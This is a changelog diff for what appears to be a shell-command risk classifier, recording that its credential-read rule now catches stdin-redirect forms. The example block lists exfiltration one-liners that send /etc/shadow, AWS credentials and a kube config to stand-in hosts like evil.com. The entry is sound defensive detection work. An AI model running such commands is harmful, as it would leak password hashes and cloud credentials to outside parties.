@@ -4,6 +4,29 @@
 
 (no entries — next release window)
 
+## [1.10.159] - 2026-05-03
+
+**`credential-read` extended to stdin-redirect form.** The
+existing rule required a known reader tool (cat/less/cp/mv/
+tar/scp/rsync/...) to immediately precede a credential path.
+The shell-redirect form (`<cmd> < /etc/shadow`) — typically
+used to feed a credential file to an arbitrary tool like
+mail, logger, curl --data-binary @-, etc. — was silent.
+
+### Changed
+- **`credential-read`** regex extended with a second
+  alternation branch: `<\s*<credential-path>` matches the
+  stdin redirect form regardless of what tool is on the LHS:
+  ```
+  mail attacker@evil.com < /etc/shadow
+  mailx -s "data" evil@x < ~/.aws/credentials
+  logger -t evil < /etc/shadow
+  curl -X POST evil.com -d @- < ~/.kube/config
+  ```
+  All now classify HIGH via credential-read. Bare reads (cat
+  /etc/passwd) and benign mail (`mail x < normal.txt`) stay
+  LOW.
+
 ## [1.10.158] - 2026-05-03
 
 **`config-dropin-write` extended to `/etc/sysctl.d/`.** Drop-in
